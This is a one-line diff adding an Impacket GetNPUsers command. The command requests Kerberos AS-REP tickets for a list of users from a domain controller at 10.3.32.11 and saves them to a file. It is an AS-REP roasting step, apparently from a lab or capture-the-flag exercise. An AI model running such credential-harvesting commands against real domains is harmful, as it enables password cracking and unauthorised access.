@@ -1,0 +1,1 @@
+impackets-GetNPUsers -request -usersfile l33tuserscleaned.txt -dc-ip 10.3.32.11 'l33thackers.stellar.tech/' -outputfile l33tpreauthtickets.txt
